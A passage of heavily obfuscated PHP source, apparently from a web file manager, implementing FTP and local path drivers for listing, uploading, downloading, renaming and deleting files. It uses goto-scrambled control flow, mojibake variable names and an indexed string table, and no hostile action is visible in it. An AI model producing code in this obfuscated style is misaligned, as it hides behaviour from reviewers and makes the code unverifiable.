$this->fileInfo($d˘•±ä’´œ, 0); } else { if ($this->isFolder($d˘•±ä’´œ)) { return $this->folderInfo($d˘•±ä’´œ); } } return !1; } private function fileList($EÕ’ù¶ŒÛˆ, &$B∂ÖºÈä¡ä, &$aµÀÍ©ÜÈñ, $bë‰¨‚†Àé = false) { goto fêç≤¬Æ–¯; f‡¬¨ÛÜâç: $EüÍØ´Í¬å = $this->listItemCache === !1 ? !1 : !0; $a∫°£¡ªÿ” = @ftp_rawlist($this->connect, $EÕ’ù¶ŒÛˆ); if (!$a∫°£¡ªÿ”) { $a∫°£¡ªÿ” = array(); } goto F¬àº∂¿äâ; fêç≤¬Æ–¯: $fùòæüﬁÕÿ =& $_SERVER[’ÿƒ†ïò]; $EÕ’ù¶ŒÛˆ = $this->iconvSystem($EÕ’ù¶ŒÛˆ); if (!$this->isFolder($EÕ’ù¶ŒÛˆ)) { return !1; } goto E∏äÙ÷¥öú; F¬àº∂¿äâ: $eÿùåØºƒΩ = array($fùòæüﬁÕÿ[95] => 1, $fùòæüﬁÕÿ[1280] => 1); foreach ($a∫°£¡ªÿ” as $D†¿ü©∞∑≈) { goto F°èŒö«å∆; Dñé„Õ¶„: if (empty($CÖôÀ’Ãñ‡) && $CÖôÀ’Ãñ‡ !== $fùòæüﬁÕÿ[191] || isset($eÿùåØºƒΩ[$CÖôÀ’Ãñ‡])) { continue; } $CÖôÀ’Ãñ‡ = $this->iconvApp($EÕ’ù¶ŒÛˆ . ltrim($CÖôÀ’Ãñ‡, $fùòæüﬁÕÿ[8])); $dÿíÒ’ÙÈ∏ = array($fùòæüﬁÕÿ[28] => $CÖôÀ’Ãñ‡, $fùòæüﬁÕÿ[29] => $fùòæüﬁÕÿ[193], $fùòæüﬁÕÿ[78] => $b≥í˜≈‰»·[4]); goto B‡≠áß—∂Ë; B‡≠áß—∂Ë: if (substr($D†¿ü©∞∑≈, 0, 1) == $fùòæüﬁÕÿ[1281]) { $dÿíÒ’ÙÈ∏[$fùòæüﬁÕÿ[29]] = $fùòæüﬁÕÿ[77]; $dÿíÒ’ÙÈ∏[$fùòæüﬁÕÿ[78]] = 0; } $b◊¬ï’Ω‘œ = $dÿíÒ’ÙÈ∏[$fùòæüﬁÕÿ[29]] == $fùòæüﬁÕÿ[77] ? !0 : !1; if ($EüÍØ´Í¬å) { $this->cacheMethod($fùòæüﬁÕÿ[199], $CÖôÀ’Ãñ‡, $b◊¬ï’Ω‘œ); $this->cacheMethod($fùòæüﬁÕÿ[200], $CÖôÀ’Ãñ‡, $dÿíÒ’ÙÈ∏); } goto C†Ù»úàäò; C†Ù»úàäò: if ($b◊¬ï’Ω‘œ) { $B∂ÖºÈä¡ä[] = $CÖôÀ’Ãñ‡; if ($bë‰¨‚†Àé) { $this->fileList($CÖôÀ’Ãñ‡, $B∂ÖºÈä¡ä, $aµÀÍ©ÜÈñ, $bë‰¨‚†Àé); } continue; } $aµÀÍ©ÜÈñ[] = $dÿíÒ’ÙÈ∏; goto c¢∆ˆüÍá«; F°èŒö«å∆: $b≥í˜≈‰»· = $this->_listItem($D†¿ü©∞∑≈); if ($b≥í˜≈‰»·[0] == $fùòæüﬁÕÿ[747]) { continue; } $CÖôÀ’Ãñ‡ = $b≥í˜≈‰»·[8]; goto Dñé„Õ¶„; c¢∆ˆüÍá«: } if ($EüÍØ´Í¬å) { $this->cacheMethod($fùòæüﬁÕÿ[199], $EÕ’ù¶ŒÛˆ, !0); } goto AçË€Ã™ÁÁ; E∏äÙ÷¥öú: @ftp_chdir($this->connect, $fùòæüﬁÕÿ[8]); $EÕ’ù¶ŒÛˆ = rtrim($EÕ’ù¶ŒÛˆ, $fùòæüﬁÕÿ[8]) . $fùòæüﬁÕÿ[8]; check_abort(); goto f‡¬¨ÛÜâç; AçË€Ã™ÁÁ: } private function _listItem($Cı∑Ç◊‰áä) { if (empty($Cı∑Ç◊‰áä)) { return array(); } $B“∆ﬂ‘±ää = preg_split($_SERVER[’ÿƒ†ïò][1282], $Cı∑Ç◊‰áä); if (count($B“∆ﬂ‘±ää) <= 9) { return $B“∆ﬂ‘±ää; } $B“∆ﬂ‘±ää[8] = trim(substr($Cı∑Ç◊‰áä, strpos($Cı∑Ç◊‰áä, $B“∆ﬂ‘±ää[7]) + strlen($B“∆ﬂ‘±ää[7]))); return array_splice($B“∆ﬂ‘±ää, 0, 9); } public function listPath($Fû‹„˘ê¨Î, $A‹»“¥Ìˆí = false) { goto a©‹√¯ÉŒÍ; EÒá¿°ˆïÜ: return array($F∑®Ÿ≤Ñ©ñ[75] => $b˜µ…ÜÜÙ∂, $F∑®Ÿ≤Ñ©ñ[74] => $B™à≥Â≤®ë); goto fÚÀœÑ¶á˘; a©‹√¯ÉŒÍ: $F∑®Ÿ≤Ñ©ñ =& $_SERVER[’ÿƒ†ïò]; if (!$this->_isconn()) { return !1; } $b˜µ…ÜÜÙ∂ = $B™à≥Â≤®ë = array(); goto bï¯§Û¯æù; bï¯§Û¯æù: $this->fileList($Fû‹„˘ê¨Î, $b˜µ…ÜÜÙ∂, $B™à≥Â≤®ë); foreach ($b˜µ…ÜÜÙ∂ as $eúîïø≠–æ => $bÛıÈáí¡≈) { $b˜µ…ÜÜÙ∂[$eúîïø≠–æ] = $this->folderInfo($bÛıÈáí¡≈, $A‹»“¥Ìˆí); } foreach ($B™à≥Â≤®ë as $eúîïø≠–æ => $bÛıÈáí¡≈) { $B™à≥Â≤®ë[$eúîïø≠–æ] = $this->fileInfo($bÛıÈáí¡≈[$F∑®Ÿ≤Ñ©ñ[28]], $A‹»“¥Ìˆí, $bÛıÈáí¡≈); } goto EÒá¿°ˆïÜ; fÚÀœÑ¶á˘: } public function has($cÖôÑÔö¥Ü, $A®Ï®≈˘˜Û = false, $Cãà°îπÈ¯ = true) { goto f®§úîÏ⁄; c§‚Öá≠µó: $this->fileList($cÖôÑÔö¥Ü, $eŸŸ•∫•—≤, $C◊†èﬁŒº‘, $bù¿ñøΩù); if ($A®Ï®≈˘˜Û) { return array($fëüœÎéÇ¨[203] => count($C◊†èﬁŒº‘), $fëüœÎéÇ¨[204] => count($eŸŸ•∫•—≤)); } if ($Cãà°îπÈ¯) { if (count($C◊†èﬁŒº‘)) { return !0; } } else { if (count($eŸŸ•∫•—≤)) { return !0; } } goto E¬¥•ÓïÃ—; E¬¥•ÓïÃ—: return !1; goto f≠ﬂ–§‚äí; f®§úîÏ⁄: $fëüœÎéÇ¨ =& $_SERVER[’ÿƒ†ïò]; $eŸŸ•∫•—≤ = $C◊†èﬁŒº‘ = array(); $bù¿ñøΩù = $A®Ï®≈˘˜Û ? !0 : !1; goto c§‚Öá≠µó; f≠ﬂ–§‚äí: } public function listAll($AÎ±Œ∂∆±Ò) { goto FËﬁâÎ‹ù¢; eı‘éØ°∂Ÿ: $this->fileList($AÎ±Œ∂∆±Ò, $e∂≤‹‡è‚›, $DàÇ≤Øäââ, !0); $e£¶ŒïÑèù = array(); foreach ($DàÇ≤Øäââ as $e≤‚Íäÿ†) { $e£¶ŒïÑèù[$e≤‚Íäÿ†[$CÇÎœ„õÆ®[28]]] = $e≤‚Íäÿ†[$CÇÎœ„õÆ®[78]]; } goto fêàΩùœéı; fêàΩùœéı: foreach ($e∂≤‹‡è‚› as $e≤‚Íäÿ†) { if (is_string($e≤‚Íäÿ†)) { $e£¶ŒïÑèù[$e≤‚Íäÿ†] = 0; } } return $this->listAllFiles($AÎ±Œ∂∆±Ò, array_keys($e£¶ŒïÑèù), $e£¶ŒïÑèù); goto c˘•éÕ€úï; FËﬁâÎ‹ù¢: $CÇÎœ„õÆ® =& $_SERVER[’ÿƒ†ïò]; if (!$this->_isconn()) { return !1; } $e∂≤‹‡è‚› = $DàÇ≤Øäââ = array(); goto eı‘éØ°∂Ÿ; c˘•éÕ€úï: } public function getContent($FòÂÃÌâﬂ¬) { if (!$this->_isconn()) { return !1; } $FòÂÃÌâﬂ¬ = $this->iconvSystem($FòÂÃÌâﬂ¬); return $this->fileSubstr($FòÂÃÌâﬂ¬); } public function setContent($bû¡µ„Í€Í, $D¶¢É’Ó‘ï = '') { goto B…ªéõÛØ∏; cÑ≠ß’Á©≠: file_put_contents($AΩ‘ûà¿Ñõ, $D¶¢É’Ó‘ï); $B© œÙë®Û = $this->upload($bû¡µ„Í€Í, $this->iconvApp($AΩ‘ûà¿Ñõ)); $this->tempFileRemve($AΩ‘ûà¿Ñõ); goto eøüØáÇÒç; B…ªéõÛØ∏: if (!$this->_isconn()) { return !1; } $eÕ∆óîèöà = $this->pathThis($this->iconvSystem($bû¡µ„Í€Í)); $AΩ‘ûà¿Ñõ = $this->tempFile($eÕ∆óîèöà); goto cÑ≠ß’Á©≠; eøüØáÇÒç: return $B© œÙë®Û; goto c€™óúÇ€≠; c€™óúÇ€≠: } public function fileSubstr($D›î≥∂Ôﬁ∏, $dˆ˘ﬁé‚ÌÉ = 0, $E≥‰ÿïó∑€ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D›î≥∂Ôﬁ∏, $dˆ˘ﬁé‚ÌÉ, $E≥‰ÿïó∑€); } private function ftpRequest($E¨´ç¶’≤Ç, $f ÔÂ•È˘¡ = 0, $fúÂ†∫ãäØ = false) { goto BûÈ»ﬂêÑ⁄; BûÈ»ﬂêÑ⁄: $E¨´ç¶’≤Ç = $this->iconvSystem($E¨´ç¶’≤Ç); $c√∞∞¨‚˘ﬂ = $this->scheme . $this->host . $_SERVER[’ÿƒ†ïò][4] . $this->port; $bÁ‹´∆Ã≤û = curl_init(); goto fÜåü÷◊›; C¶á•ﬂÇµ˜: curl_setopt($bÁ‹´∆Ã≤û, CURLOPT_RETURNTRANSFER, 1); $FŸªÜä÷ãì = curl_exec($bÁ‹´∆Ã≤û); curl_close($bÁ‹´∆Ã≤û); goto eæ◊Ç˘ÎÏ; eæ◊Ç˘ÎÏ: return $FŸªÜä÷ãì; goto eªÍÜ‘ëàØ; fÜåü÷◊›: curl_setopt($bÁ‹´∆Ã≤û, CURLOPT_URL, $c√∞∞¨‚˘ﬂ . $this->pathEncode($E¨´ç¶’≤Ç)); curl_setopt($bÁ‹´∆Ã≤û, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($fúÂ†∫ãäØ) { $FÏòª∆Ìë¥ = $f ÔÂ•È˘¡ + $fúÂ†∫ãäØ - 1; curl_setopt($bÁ‹´∆Ã≤û, CURLOPT_RANGE, "{$f ÔÂ•È˘¡}\55{$FÏòª∆Ìë¥}"); } goto C¶á•ﬂÇµ˜; eªÍÜ‘ëàØ: } public function upload($E¶◊¡«ÉÏà, $eº“ΩÈ•∫€, $Dô¯¢Ü…≈í = false, $bô∞Âîﬁèƒ = REPEAT_REPLACE) { goto a≠ﬁπ—∂≠´; E≥Ê≥∆¥ƒ°: $eº“ΩÈ•∫€ = $this->iconvSystem($eº“ΩÈ•∫€); $bÛ”˘§†‹Ú = ftp_nb_put($this->connect, $E¶◊¡«ÉÏà, $eº“ΩÈ•∫€, FTP_BINARY); while ($bÛ”˘§†‹Ú == FTP_MOREDATA) { $bÛ”˘§†‹Ú = ftp_nb_continue($this->connect); } goto eµ…ªîóÏπ; eµ…ªîóÏπ: if ($bÛ”˘§†‹Ú != FTP_FINISHED) { return !1; } return $this->getPathOuter($E¶◊¡«ÉÏà); goto a¢ˆôœ÷∑¡; a≠ﬁπ—∂≠´: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($E¶◊¡«ÉÏà))) { return !1; } $E¶◊¡«ÉÏà = $this->iconvSystem($E¶◊¡«ÉÏà); goto E≥Ê≥∆¥ƒ°; a¢ˆôœ÷∑¡: } public function download($Bç©ÉçÌÕÒ, $c«–òÎ»ú÷ = '') { goto B¡§Í∆¯Ü’; bºßÍöï√◊: while ($E®£Îîıò• == FTP_MOREDATA) { $E®£Îîıò• = ftp_nb_continue($this->connect); } if ($E®£Îîıò• != FTP_FINISHED) { return !1; } return $this->iconvApp($c«–òÎ»ú÷); goto D«å≠öÚ¨Æ; eí¢©é∞÷≥: $Bç©ÉçÌÕÒ = $this->iconvSystem($Bç©ÉçÌÕÒ); $c«–òÎ»ú÷ = $this->iconvSystem($c«–òÎ»ú÷); $E®£Îîıò• = ftp_nb_get($this->connect, $c«–òÎ»ú÷, $Bç©ÉçÌÕÒ, FTP_BINARY); goto bºßÍöï√◊; B¡§Í∆¯Ü’: if (!$this->_isconn()) { return !1; } $f’Öı…¢∏© = $this->pathFather($c«–òÎ»ú÷); if (!IO::mkdir($f’Öı…¢∏©)) { return !1; } goto eí¢©é∞÷≥; D«å≠öÚ¨Æ: } public function exist($F‹ÂÇÿŒñÏ) { return $this->isFile($F‹ÂÇÿŒñÏ) || $this->isFolder($F‹ÂÇÿŒñÏ); } public function isFile($b“ùï–íëö) { return !$this->isFolder($b“ùï–íëö) && $this->objectMeta($b“ùï–íëö); } public function isFolder($dÀÕÖ§π) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][199], $dÀÕÖ§π); } protected function objectMeta($Dﬂä›ó§‡Â) { return $this->cacheMethod($_SERVER[’ÿƒ†ïò][200], $Dﬂä›ó§‡Â); } protected function _objectMeta($A€·˜â≤Ï™) { goto a∆êﬁÒë–˜; cëﬂÊØÙÑù: $Eﬁ™äßáæ’ = @ftp_size($this->connect, $A€·˜â≤Ï™); if ($Eﬁ™äßáæ’ != -1) { $a¨õØ˜Úÿ”[$e¯å∂Í≠…π[78]] = $Eﬁ™äßáæ’; } else { $bóÉï‡à´ï = @ftp_chdir($this->connect, $A€·˜â≤Ï™); if (!$bóÉï‡à´ï) { return !1; } $a¨õØ˜Úÿ”[$e¯å∂Í≠…π[29]] = $e¯å∂Í≠…π[77]; } return $a¨õØ˜Úÿ”; goto C…íä⁄èﬁ›; b„∂çÂ√’˜: $A€·˜â≤Ï™ = $this->iconvSystem($A€·˜â≤Ï™); $a¨õØ˜Úÿ” = array($e¯å∂Í≠…π[28] => $this->iconvApp($A€·˜â≤Ï™), $e¯å∂Í≠…π[29] => $e¯å∂Í≠…π[193], $e¯å∂Í≠…π[78] => 0); @ftp_chdir($this->connect, $e¯å∂Í≠…π[8]); goto cëﬂÊØÙÑù; a∆êﬁÒë–˜: $e¯å∂Í≠…π =& $_SERVER[’ÿƒ†ïò]; if ($A€·˜â≤Ï™ == $e¯å∂Í≠…π[33] || $A€·˜â≤Ï™ == $e¯å∂Í≠…π[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto b„∂çÂ√’˜; C…íä⁄èﬁ›: } protected function _isFolder($c‚Í†ÿ¥úÓ) { $dƒâ—Ç¿ÌÁ =& $_SERVER[’ÿƒ†ïò]; if ($c‚Í†ÿ¥úÓ == $dƒâ—Ç¿ÌÁ[33] || $c‚Í†ÿ¥úÓ == $dƒâ—Ç¿ÌÁ[8]) { return !0; } $Eà–îÕ±ı∫ = $this->_objectMeta($c‚Í†ÿ¥úÓ); return isset($Eà–îÕ±ı∫[$dƒâ—Ç¿ÌÁ[29]]) && $Eà–îÕ±ı∫[$dƒâ—Ç¿ÌÁ[29]] == $dƒâ—Ç¿ÌÁ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($A€Çë„√‘Ó) { if (substr($A€Çë„√‘Ó, 0, 2) == $_SERVER[’ÿƒ†ïò][1273]) { $A€Çë„√‘Ó = BASIC_PATH . substr($A€Çë„√‘Ó, 2); } return $A€Çë„√‘Ó; } public function iconvApp($Bì±ı˘Çã’) { $bÂèüë≈ﬁê =& $_SERVER[’ÿƒ†ïò]; global $config; return $this->iconvTo($Bì±ı˘Çã’, $config[$bÂèüë≈ﬁê[1271]], $config[$bÂèüë≈ﬁê[1270]]); } public function iconvSystem($fÎƒ¶§’£Æ) { $DÛ‰°…ÓÜ≤ =& $_SERVER[’ÿƒ†ïò]; global $config; return $this->iconvTo($fÎƒ¶§’£Æ, $config[$DÛ‰°…ÓÜ≤[1270]], $config[$DÛ‰°…ÓÜ≤[1271]]); } public function getPathOuter($f∑ÇËüœ›õ) { goto FÚ‹∑ª«∑è; D≥±áê¨íÖ: return $this->pathDriver . $eëé∂µ◊ÒÔ[8] . ltrim($f∑ÇËüœ›õ, $eëé∂µ◊ÒÔ[8]); goto F—†πÎŸ £; b£πÇ°¥…„: $f∑ÇËüœ›õ = KodIO::clear($f∑ÇËüœ›õ); $f∑ÇËüœ›õ = substr($f∑ÇËüœ›õ, strlen($BÍ†≈‹¨—å)); if (empty($this->pathDriver)) { return $f∑ÇËüœ›õ; } goto D≥±áê¨íÖ; CÇ∞§ÃÑ˘¡: if (substr($BÍ†≈‹¨—å, 0, 2) == $eëé∂µ◊ÒÔ[1273]) { $BÍ†≈‹¨—å = BASIC_PATH . substr($BÍ†≈‹¨—å, 2); } if (substr($f∑ÇËüœ›õ, 0, 2) == $eëé∂µ◊ÒÔ[1273]) { $f∑ÇËüœ›õ = BASIC_PATH . substr($f∑ÇËüœ›õ, 2); } $BÍ†≈‹¨—å = KodIO::clear($BÍ†≈‹¨—å); goto b£πÇ°¥…„; FÚ‹∑ª«∑è: $eëé∂µ◊ÒÔ =& $_SERVER[’ÿƒ†ïò]; $BÍ†≈‹¨—å = $this->iconvApp($this->pathBase); $f∑ÇËüœ›õ = $this->iconvApp($f∑ÇËüœ›õ); goto CÇ∞§ÃÑ˘¡; F—†πÎŸ £: } public function mkfile($f∏Ü⁄´É®–, $eó›—ÂÊÇ∂ = '', $eúÂë“‘‹â = REPEAT_RENAME) { $f∏Ü⁄´É®– = $this->iconvSystem($f∏Ü⁄´É®–); @touch($f∏Ü⁄´É®–); if ($eó›—ÂÊÇ∂) { file_put_contents($f∏Ü⁄´É®–, $eó›—ÂÊÇ∂); } @chmod($f∏Ü⁄´É®–, $this->pathAuth); return is_file($f∏Ü⁄´É®–) ? $this->getPathOuter($f∏Ü⁄´É®–) : !1; } public function mkdir($eÛ‘õˆˆíõ, $Fæåßπú©‹ = REPEAT_SKIP) { $eÛ‘õˆˆíõ = $this->iconvSystem($eÛ‘õˆˆíõ); if (is_dir($eÛ‘õˆˆíõ)) { return $this->getPathOuter($eÛ‘õˆˆíõ); } @mkdir($eÛ‘õˆˆíõ, $this->pathAuth, !0); @chmod($eÛ‘õˆˆíõ, $this->pathAuth); return is_dir($eÛ‘õˆˆíõ) ? $this->getPathOuter($eÛ‘õˆˆíõ) : !1; } public function copyFile($Eãåöÿëã¡, $a´ô≥ÎŸË—) { $this->mkdir($this->pathFather($a´ô≥ÎŸË—)); $Eãåöÿëã¡ = $this->iconvSystem($Eãåöÿëã¡); $a´ô≥ÎŸË— = $this->iconvSystem($a´ô≥ÎŸË—); $F¶Çä⁄º¡Á = copy_64($Eãåöÿëã¡, $a´ô≥ÎŸË—); @chmod($a´ô≥ÎŸË—, $this->pathAuth); return $F¶Çä⁄º¡Á ? $this->getPathOuter($a´ô≥ÎŸË—) : !1; } public function moveFile($c≤Æ˜°√‹‚, $cæ—‡Ë•¶µ) { goto a¿êπﬁ€º†; a«€÷ƒ•‚ı: $B€ëìÃÖó‚ = intval(@rename($c≤Æ˜°√‹‚, $cæ—‡Ë•¶µ)); if (!$B€ëìÃÖó‚) { if ($B€ëìÃÖó‚ = intval(@copy_64($c≤Æ˜°√‹‚, $cæ—‡Ë•¶µ))) { @unlink($c≤Æ˜°√‹‚); } } @chmod($cæ—‡Ë•¶µ, $this->pathAuth); goto b¨áòÇÿ·´; b¨áòÇÿ·´: return $B€ëìÃÖó‚ ? $this->getPathOuter($cæ—‡Ë•¶µ) : !1; goto fûãºÌ◊Óá; a¿êπﬁ€º†: $this->mkdir($this->pathFather($cæ—‡Ë•¶µ)); $c≤Æ˜°√‹‚ = $this->iconvSystem($c≤Æ˜°√‹‚); $cæ—‡Ë•¶µ = $this->iconvSystem($cæ—‡Ë•¶µ); goto a«€÷ƒ•‚ı; fûãºÌ◊Óá: } public function delFile($f¨ÆéáÒ©ï) { $f¨ÆéáÒ©ï = $this->iconvSystem($f¨ÆéáÒ©ï); if (!@unlink($f¨ÆéáÒ©ï)) { @chmod($f¨ÆéáÒ©ï, $this->pathAuth); if (!@unlink($f¨ÆéáÒ©ï)) { return !1; } } else { return !0; } } public function delFolder($d„˘É¡„Ïƒ) { goto Fò·®ÔéåÖ; fßü⁄˜éÿë: if (!($FôªΩÑâìà = opendir($d„˘É¡„Ïƒ))) { return !1; } while (($DÀØÁë°≥ä = readdir($FôªΩÑâìà)) !== !1) { if ($DÀØÁë°≥ä == $AÃå›√áÕ©[95] || $DÀØÁë°≥ä == $AÃå›√áÕ©[1280]) { continue; } $DÔáÂÏÛâ‚ = $d„˘É¡„Ïƒ . $AÃå›√áÕ©[8] . $DÀØÁë°≥ä; if (is_file($DÔáÂÏÛâ‚) || is_link($DÔáÂÏÛâ‚)) { if (!unlink($DÔáÂÏÛâ‚)) { chmod($DÔáÂÏÛâ‚, $this->pathAuth); if (!unlink($DÔáÂÏÛâ‚)) { return !1; } } } else { if (is_dir($DÔáÂÏÛâ‚)) { chmod($DÔáÂÏÛâ‚, $this->pathAuth); $DÔáÂÏÛâ‚ = $this->iconvApp($DÔáÂÏÛâ‚); if (!$this->delFolder($DÔáÂÏÛâ‚)) { return !1; } } } } closedir($FôªΩÑâìà); goto CÉáÙ”èÌó; Fò·®ÔéåÖ: $AÃå›√áÕ© =& $_SERVER[’ÿƒ†ïò]; $d„˘É¡„Ïƒ = $this->iconvSystem($d„˘É¡„Ïƒ); if (!is_dir($d„˘É¡„Ïƒ)) { return !0; } goto fßü⁄˜éÿë; CÉáÙ”èÌó: return rmdir($d„˘É¡„Ïƒ); goto A“…¯öıÆø; A“…¯öıÆø: } public function rename($B£ç∂€ª©Ÿ, $DæœÖè˜ßè) { goto AΩ©˘äÖü; AΩ©˘äÖü: $A„øªÓ∑÷¯ =& $_SERVER[’ÿƒ†ïò]; $dﬂßé¿Øµá = $this->fileNameAuto($this->pathFather($B£ç∂€ª©Ÿ), $DæœÖè˜ßè); $dﬂßé¿Øµá = $this->iconvSystem($dﬂßé¿Øµá); goto fù≈ââ√ÖΩ; f¬§ ô¡ç¥: $DèΩ¢”∏À€ = @rename($B£ç∂€ª©Ÿ, $FÆ¬œ’ﬂùö); $FÆ¬œ’ﬂùö = $this->iconvApp($FÆ¬œ’ﬂùö); return $DèΩ¢”∏À€ ? $this->getPathOuter($FÆ¬œ’ﬂùö) : !1; goto AÈ…∑ááå∑; fù≈ââ√ÖΩ: $B£ç∂€ª©Ÿ = $this->iconvSystem($B£ç∂€ª©Ÿ); $BÔé©˘ˆÜÊ = $this->pathFather($B£ç∂€ª©Ÿ); $FÆ¬œ’ﬂùö = rtrim($BÔé©˘ˆÜÊ, $A„øªÓ∑÷¯[8]) . $A„øªÓ∑÷¯[8] . $dﬂßé¿Øµá; goto f¬§ ô¡ç¥; AÈ…∑ááå∑: } public function size($eØÚ¢Í±ÜÇ) { $eØÚ¢Í±ÜÇ = $this->iconvSystem($eØÚ¢Í±ÜÇ); return filesize_64($eØÚ¢Í±ÜÇ); } public function info($DÁıªÑø ≥) { $DÁıªÑø ≥ = $this->iconvSystem($DÁıªÑø ≥); if ($this->isFolder($DÁıªÑø ≥)) { return $this->folderInfo($DÁıªÑø ≥); } else { if ($this->isFile($DÁıªÑø ≥)) { return $this->fileInfo($DÁıªÑø ≥); } } return !1; } protected function infoChildren($DëíÜéÜè√, &$Bﬂ¯‡Ô∆óŒ, $Cõ‘Âúñí = true) { goto DÇ∏£»ﬂê›; fõ‡ºæÀàÁ: closedir($c”≤á˘Ë’Ÿ); goto bäÔç≤ëáå; DÇ∏£»ﬂê›: $BäôñÛ†º‚ =& $_SERVER[’ÿƒ†ïò]; check_abort_echo(); $DëíÜéÜè√ = rtrim($DëíÜéÜè√, $BäôñÛ†º‚[8]) . $BäôñÛ†º‚[8]; goto BŸ£‹™ñÃá; BŸ£‹™ñÃá: if ($Cõ‘Âúñí) { $DëíÜéÜè√ = $this->iconvSystem($DëíÜéÜè√); } if (!($c”≤á˘Ë’Ÿ = @opendir($DëíÜéÜè√))) { return; } while (($cÑﬂíÇëËØ = readdir($c”≤á˘Ë’Ÿ)) !== !1) { if ($cÑﬂíÇëËØ == $BäôñÛ†º‚[95] || $cÑﬂíÇëËØ == $BäôñÛ†º‚[1280]) { continue; } $f¶≈ÂÙõäñ = $DëíÜéÜè√ . $cÑﬂíÇëËØ; if (is_file($f¶≈ÂÙõäñ) || is_link($f¶≈ÂÙõäñ)) { $Bﬂ¯‡Ô∆óŒ[$BäôñÛ†º‚[79]]++; $Bﬂ¯‡Ô∆óŒ[$BäôñÛ†º‚[78]] += filesize_64($f¶≈ÂÙõäñ); } else { if (is_dir($f¶≈ÂÙõäñ)) { $Bﬂ¯‡Ô∆óŒ[$BäôñÛ†º‚[80]]++; $this->infoChildren($f¶≈ÂÙõäñ, $Bﬂ¯‡Ô∆óŒ, !1); } } } goto fõ‡ºæÀàÁ; bäÔç≤ëáå: } private function folderInfo($B∫›—¥ª¥Ô, $Bæ„Ï√›¢ì = false) { $fç„‹ﬂ±ÿ¨ =& $_SERVER[’ÿƒ†ïò]; $B∫›—¥ª¥Ô = rtrim($B∫›—¥ª¥Ô, $fç„‹ﬂ±ÿ¨[8]) . $fç„‹ﬂ±ÿ¨[8]; $CúëáÃÜåé = $this->iconvApp($this->pathThis($B∫›—¥ª¥Ô)); if ($Bæ„Ï√›¢ì) { return array($fç„‹ﬂ±ÿ¨[28] => $CúëáÃÜåé, $fç„‹ﬂ±ÿ¨[76] => $this->getPathOuter($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[29] => $fç„‹ﬂ±ÿ¨[77]); } $eú–‰§ôÜ∆ = array($fç„‹ﬂ±ÿ¨[28] => $CúëáÃÜåé, $fç„‹ﬂ±ÿ¨[76] => $this->getPathOuter($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[29] => $fç„‹ﬂ±ÿ¨[77], $fç„‹ﬂ±ÿ¨[194] => @filectime($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[84] => @filemtime($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[1283] => @fileatime($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[1284] => is_readable($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[1285] => is_writable($B∫›—¥ª¥Ô), $fç„‹ﬂ±ÿ¨[1286] => get_mode($B∫›—¥ª¥Ô)); return $eú–‰§ôÜ∆; } private function fileInfo($FÛò€°§‹Ó, $DÚüä ««π = false) { $Eá∏‘®•ÇÎ =& $_SERVER[’ÿƒ†ïò]; $A“ıçíè•è = $this->iconvApp($this->pathThis($FÛò€°§‹Ó)); if ($DÚüä ««π) { return array($Eá∏‘®•ÇÎ[28] => $A“ıçíè•è, $Eá∏‘®•ÇÎ[76] => $this->getPathOuter($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[29] => $Eá∏‘®•ÇÎ[193], $Eá∏‘®•ÇÎ[78] => $this->size($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[168] => $this->ext($A“ıçíè•è)); } $FË—Â”‹⁄Ù = array($Eá∏‘®•ÇÎ[28] => $A“ıçíè•è, $Eá∏‘®•ÇÎ[76] => $this->getPathOuter($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[29] => $Eá∏‘®•ÇÎ[193], $Eá∏‘®•ÇÎ[194] => @filectime($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[84] => @filemtime($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[1283] => @fileatime($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[78] => $this->size($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[168] => $this->ext($A“ıçíè•è), $Eá∏‘®•ÇÎ[1284] => is_readable($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[1285] => is_writable($FÛò€°§‹Ó), $Eá∏‘®•ÇÎ[1286] => get_mode($FÛò€°§‹Ó)); return $FË—Â”‹⁄Ù; } public function exist($FÃ∫óìŸ©ù) { $FÃ∫óìŸ©ù = $this->iconvSystem($FÃ∫óìŸ©ù); return @file_exists($FÃ∫óìŸ©ù); } public function isFile($e˜ ¢÷éÀ“) { $e˜ ¢÷éÀ“ = $this->iconvSystem($e˜ ¢÷éÀ“); return @is_file($e˜ ¢÷éÀ“); } public function isFolder($Eê£≥Ê«Ÿ∂) { $Eê£≥Ê«Ÿ∂ = $this->iconvSystem($Eê£≥Ê«Ÿ∂); return @is_dir($Eê£≥Ê«Ÿ∂); } public function listPath($b£Ü©ﬁåëÁ, $CÇ—∆Âì‚• = false) { goto EóÙ¿åèÎ‰; B‹Íäºäœé: closedir($F‚ÇÌÏÃ≠õ); return $AÍÁ∫ºŒ≤°; goto bàÒæŒà’; EóÙ¿åèÎ‰: $fá≠Âß‘åÉ =& $_SERVER[’ÿƒ†ïò]; $b£Ü©ﬁåëÁ = $this->iconvSystem($b£Ü©ﬁåëÁ); $b£Ü©ﬁåëÁ = rtrim($b£Ü©ﬁåëÁ, $fá≠Âß‘åÉ[8]) . $fá≠Âß‘åÉ[8]; goto f‡ó§ó∏Çﬁ; f‡ó§ó∏Çﬁ: $AÍÁ∫ºŒ≤° = array($fá≠Âß‘åÉ[75] => array(), $fá≠Âß‘åÉ[74] => array()); if (!($F‚ÇÌÏÃ≠õ = @opendir($b£Ü©ﬁåëÁ))) { return $AÍÁ∫ºŒ≤°; } while (($CÖàıÛ€¶† = readdir($F‚ÇÌÏÃ≠õ)) !== !1) { if ($CÖàıÛ€¶† == $fá≠Âß‘åÉ[95] || $CÖàıÛ€¶† == 